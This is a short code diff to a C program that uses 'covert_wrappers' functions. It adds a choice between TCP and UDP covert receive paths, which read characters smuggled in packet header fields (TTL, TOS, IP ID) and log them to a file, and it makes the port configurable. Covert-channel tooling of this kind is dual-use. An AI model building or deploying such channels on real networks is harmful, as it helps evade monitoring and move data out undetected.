@@ -18,7 +18,7 @@
 #include <stdlib.h>
 #include "covert_wrappers.h"
 
-void recv_results(char* sip, unsigned short sport, char* filename) {
+void recv_results(char* sip, unsigned short sport, char* filename, bool tcp) {
     FILE* file;
     char input;
 
@@ -30,7 +30,11 @@ void recv_results(char* sip, unsigned short sport, char* filename) {
     }
 
     while(1) {
+        if(tcp){
         input = covert_recv(sip, sport, 1, 0, 0, 0);
+        } else {
+        input = covert_udp_recv(sip, sport, true, false, false);
+        }
         if(input > 0) {
             printf("Output(%d): %c\n", input, input);
             fprintf(file, "%c", input);
@@ -305,7 +309,7 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     }
     printf("Sending Data(%d)\n\n\n", bytes_sent);
 }
-char covert_udp_recv(char *sip, bool ttl, bool tos, bool ipid) {
+char covert_udp_recv(char *sip, unsigned short sport, bool ttl, bool tos, bool ipid) {
     int recv_socket, n, bytes_recv;
     unsigned int sip_binary;
     //struct recv_tcp recv_packet;
@@ -320,7 +324,7 @@ char covert_udp_recv(char *sip, bool ttl, bool tos, bool ipid) {
     struct sockaddr_in sin;
     socklen_t socklen;
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(8505);
+    sin.sin_port = htons(sport);
     sin.sin_addr.s_addr = inet_addr(sip);
     socklen = (socklen_t) sizeof(sin);
 
